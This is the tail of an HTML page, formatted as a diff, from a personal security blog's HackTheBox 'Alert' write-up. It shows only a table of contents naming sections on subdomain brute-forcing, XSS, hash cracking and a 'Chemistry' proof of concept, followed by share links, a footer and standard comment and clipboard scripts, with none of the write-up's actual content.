+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4"><span class="toc-number">1.</span> <span class="toc-text">子域名爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">xss漏洞触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4hash"><span class="toc-number">3.</span> <span class="toc-text">爆破hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chemistry"><span class="toc-number"></span> <span class="toc-text">Chemistry</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">漏洞利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E6%8B%AC"><span class="toc-number">2.</span> <span class="toc-text">概括</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">3.</span> <span class="toc-text">细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">易受攻击的代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E8%AF%81%E6%98%8E"><span class="toc-number">4.</span> <span class="toc-text">概念证明</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&text=htb-Alert"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&is_video=false&description=htb-Alert"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=htb-Alert&body=Check out this article: https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&title=htb-Alert"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&name=htb-Alert&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2024/10/03/%E5%9F%9F%E6%B8%97%E9%80%8F/htb-Alert/&t=htb-Alert"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Ca1m
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
